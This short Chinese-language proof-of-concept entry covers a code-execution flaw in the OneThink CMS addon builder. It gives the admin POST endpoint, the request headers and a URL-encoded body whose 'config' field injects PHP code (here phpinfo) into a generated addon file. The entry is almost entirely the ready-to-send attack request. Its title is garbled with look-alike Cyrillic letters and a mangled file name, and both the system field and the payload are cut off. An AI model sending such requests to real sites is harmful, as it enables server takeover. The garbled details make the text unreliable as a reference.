# onethinkAddоnkCоntrоllеr.сlаrt.php组件任意代码执行漏洞

- **系统**：onethinkAddоnkCоntrоllеr.сlаrt.php组件任意　|　**类型**：命令执行　|　**CVE**：—
- **请求**：`POST /admin.php?s=/Addons/build.html HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`　`Sec-GPC: 1`　`Cookie: PHPSESSID=*********; onethink_admin___forward__=%2Fadmin.php%3Fs%3D%2FAddons%2Fi…`

**请求体 / payload**
```
info%5Bname%5D=Examplepoi&info%5Btitle%5D=%E7%A4%BA%E5%88%97&info%5Bversion%5D=0.1&info%5Bauthor%5D=%E6%97%A0%E5%90%8D&info%5Bdescription%5D=%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E4%B8%B4%E6%97%B6%E6%8F%8F%E8%BF%B011&info%5Bstatus%5D=1&config=%3C%3Fphp%20phpinfo%28%29%3B%3F%3E&custom_config=&admin_list='model'%3D%3E'Example'%2C%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E8%A1%A8%0D%0A%09%09%09'fields'%3D%3E'*'%2C%09%09%09%2F%2F%E8%A6%81%E6%9F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%0D%0A%09%09%09'map'%3D%3E''%2C%09%09%09%09%2F%2F%E6%9F%A5%E8%AF%A2%E6%9D%A1%E4%BB%B6%2C+%E5%A6%82%E6%9E%9C%E9%9C%80%E8%A6%81%E5%…（脚本共 1747 字，完整版见原文）
```
- **预期**：200　|　—